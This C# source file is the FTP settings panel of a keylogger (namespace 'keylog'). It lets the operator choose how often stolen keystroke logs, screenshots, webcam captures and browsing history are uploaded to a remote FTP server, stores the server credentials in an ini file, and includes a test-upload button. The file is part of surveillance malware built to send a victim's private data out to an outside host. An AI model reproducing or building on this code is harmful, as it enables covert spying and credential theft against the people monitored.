using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using tt;

namespace keylog
{
    public partial class FTP : UserControl
    {
        public FTP()
        {
            InitializeComponent();
        }

        private Dictionary<string, string> d = new Dictionary<string, string>();
        private void bt_OK_Click(object sender, EventArgs e)
        {
            //  clear dictionary
            d.Clear();
            // go back to main form
            if (!mainForm.Instince.Metrocontainer.Controls.ContainsKey("Dashboard"))
            {
                Dashboard general = new Dashboard();
                general.Dock = DockStyle.Fill;
                mainForm.Instince.Metrocontainer.Controls.Add(general);
            }
            mainForm.Instince.Metrocontainer.Controls["Dashboard"].BringToFront();
            mainForm.Instince.Metroback.Visible = false;

            if (tb_hours.Text.Trim() == "" || tb_hours.Text.All(char.IsDigit) == false)
                tb_hours.Text = "12";
            if (tb_minutes.Text.Trim() == "" || tb_minutes.Text.All(char.IsDigit) == false)
                tb_minutes.Text = "0";
            // save config in file
            if (cb_enable.Checked == false)
                d.Add("Enable", "false");
            else
            {
                int iHours;
                Int32.TryParse(tb_hours.Text.Trim(), out iHours);
                int iMinutes;
                Int32.TryParse(tb_minutes.Text.Trim(), out iMinutes);

                if (iHours < 0 || iMinutes <= 0 || iHours > 501 || iMinutes > 501)
                {
                    MessageBox.Show("Value hours from 0 to 500 \r\n Value minutes from 1 to 500.", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

                if (tb_kb.Text.All(char.IsDigit) || tb_kb.Text.Trim() == "")
                    tb_kb.Text = "5000";
                int iLimit;
                Int32.TryParse(tb_kb.Text, out iLimit);
                if (cb_keystroke.Checked)
                {

                    if (iLimit > 2000000000 || iLimit <= 0)
                    {
                        MessageBox.Show("Value limit from 1 to 20000000", "Alert", MessageBoxButtons.OK, MessageBoxIcon.Error);
                        return;
                    }

                }

                if (cb_enable.Checked)
                {
                    d.Add("Enable", "true");
                    d.Add("Hours", tb_hours.Text.Trim());
                    d.Add("Minutes", tb_minutes.Text.Trim());

                    if (cb_keystroke.Checked)
                        d.Add("Logs", "true");
                    else
                        d.Add("Logs", "false");

                    if (cb_images.Checked)
                        d.Add("Images", "true");
                    else
                        d.Add("Images", "false");

                    if (cb_webcam.Checked)
                        d.Add("Webcam", "true");
                    else
                        d.Add("Webcam", "false");

                    if (cb_website.Checked)
                        d.Add("Websites", "true");
                    else
                        d.Add("Websites", "false");

                    if (cb_logsize.Checked)
                    {
                        d.Add("Limit", "true");
                        d.Add("Kb", tb_kb.Text.Trim());
                    }
                    else
                        d.Add("Limit", "false");

                    if (cb_clearthelogs.Checked)
                        d.Add("Clear", "true");
                    else
                        d.Add("Clear", "false");

                    d.Add("Hostname", tb_hostname.Text.Trim());
                    //d.Add("Port", mtxtPortFTP.Text.Trim());
                    d.Add("Username", tb_username.Text.Trim());
                    d.Add("Password", tb_password.Text.Trim());
                    d.Add("Dir", tb_remoteDir.Text.Trim());

                    if (cb_usepasivemode.Checked)
                        d.Add("Passive", "true");
                    else
                        d.Add("Passive", "false");
                }
            }
            // delete old file if exists
            if (File.Exists("ftp_conf.ini"))
                File.Delete("ftp_conf.ini");

            using (StreamWriter file = new StreamWriter("ftp_conf.ini"))
                foreach (var entry in d)
                    file.WriteLine("{0},{1}", entry.Key, entry.Value);

        }

        private void FTP_Load(object sender, EventArgs e)
        {
            if (File.Exists("ftp_conf.ini"))
            {
                Functions.Load_File("ftp_conf.ini", d);

                if (Boolean.Parse(d["Enable"]))
                {
                    cb_enable.Checked = true;
                    tb_hours.Text = d["Hours"].ToString();
                    tb_minutes.Text = d["Minutes"].ToString();
                    cb_keystroke.Checked = Boolean.Parse(d["Logs"].ToString());
                    cb_images.Checked = Boolean.Parse(d["Images"].ToString());
                    cb_webcam.Checked = Boolean.Parse(d["Webcam"].ToString());
                    cb_website.Checked = Boolean.Parse(d["Websites"].ToString());

                    if (Boolean.Parse(d["Limit"].ToString()))
                    {
                        cb_logsize.Checked = true;
                        tb_kb.Text = d["Kb"].ToString();
                    }
                    else
                        cb_logsize.Checked = false;

                    cb_clearthelogs.Checked = Boolean.Parse(d["Clear"].ToString());

                    tb_hostname.Text = d["Hostname"].ToString();
                    tb_username.Text = d["Username"].ToString();
                    tb_password.Text = d["Password"].ToString();
                    //mtxtPortFTP.Text = d["Port"].ToString();
                    tb_remoteDir.Text = d["Dir"].ToString();
                    cb_usepasivemode.Checked = Boolean.Parse(d["Passive"].ToString());

                }
            }
        }

        private void btn_SendTest_Click(object sender, EventArgs e)
        {
            FileStream fs = new FileStream("ftp.txt", FileMode.Create);
            StreamWriter sw = new StreamWriter(fs, Encoding.UTF8);
            sw.Write("Successful");
            sw.Close();
            fs.Close();

            Functions.Upload("ftp.txt", true);
        }
    }
}
